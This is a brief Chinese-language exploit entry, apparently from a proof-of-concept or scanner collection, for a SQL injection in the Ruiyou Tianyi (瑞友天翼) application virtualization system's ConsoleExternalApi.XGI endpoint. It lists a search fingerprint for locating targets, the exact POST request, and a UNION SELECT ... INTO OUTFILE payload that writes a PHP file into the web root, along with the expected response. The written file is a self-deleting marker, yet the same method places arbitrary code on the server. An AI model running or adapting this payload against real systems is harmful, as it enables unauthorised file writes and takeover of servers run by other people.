# 瑞友天翼虚拟化系统ConsoleExternalApi.XGISQL注入

瑞友天翼虚拟化系统ConsoleExternalApi.XGI ｜ SQL注入 ｜ —
- **指纹**：`title="瑞友天翼－应用虚拟化系统"`
- **请求**：`POST /ConsoleExternalApi.XGI?initParams=command_createUser__pwd_1&key=inner&sign=9252fae35ff226ec26c4d1d9566ebbde HTTP/1.1`

**Payload**
```
"account": "1' union select '<?php echo \"DudeSuite\";unlink(__FILE__); ?>',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL into outfile '..\\\\..\\\\WebRoot\\\\dudesuite.xgi'#",
"userPwd": "1"
```
- **响应特征**：200